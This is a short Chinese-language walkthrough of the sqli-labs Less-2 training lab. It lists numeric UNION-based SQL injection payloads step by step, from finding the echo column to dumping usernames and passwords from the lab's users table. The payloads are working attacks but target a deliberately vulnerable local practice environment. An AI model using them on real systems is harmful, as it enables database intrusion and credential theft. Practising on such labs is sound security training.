---
title: Less  - 02
date: 2023-03-13T12:28:50Z
lastmod: 2023-03-13T12:48:40Z
---

# Less  - 02

---

# 通关教程

---

## 1、判断闭合

---

使用的payload如下

```http
http://127.0.0.1/sql1/Less-2/?id=1
http://127.0.0.1/sql1/Less-2/?id=1'
http://127.0.0.1/sql1/Less-2/?id=1--+
```

​![image](assets/image-20230313123512-19s5uek.png)​

​![image](assets/image-20230313123542-t0gjzhn.png)​

## 2、查看回显位置

---

```http
http://192.168.225.132/sqli-labs/Less-2/?id=0 union select 1,2,3--+
```

​![image](assets/image-20230313123732-53rzzxr.png)​

## 3、查看当前数据库和用户

---

```http
http://192.168.225.132/sqli-labs/Less-2/?id=0 union select 1,database(),user()--+
```

​![image](assets/image-20230313123850-h15hmkq.png)​

## 4、查看数据表

---

```http
http://192.168.225.132/sqli-labs/Less-2/?id=0 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),user()--+
```

​![image](assets/image-20230313124202-b42brd5.png)​

## 5、查看数据表的字段

---

```http
http://192.168.225.132/sqli-labs/Less-2/?id=0 union select 1,(select group_concat(column_name) from information_schema.columns where table_name='users'),user()--+
```

​![image](assets/image-20230313124548-nooz0o5.png)​

## 6、查看字段值

---

```http
http://192.168.225.132/sqli-labs/Less-2/?id=0 union select 1,(select group_concat(username,password) from security.users),user()--+
```

​![image](assets/image-20230313124830-rj98ohm.png)​

‍
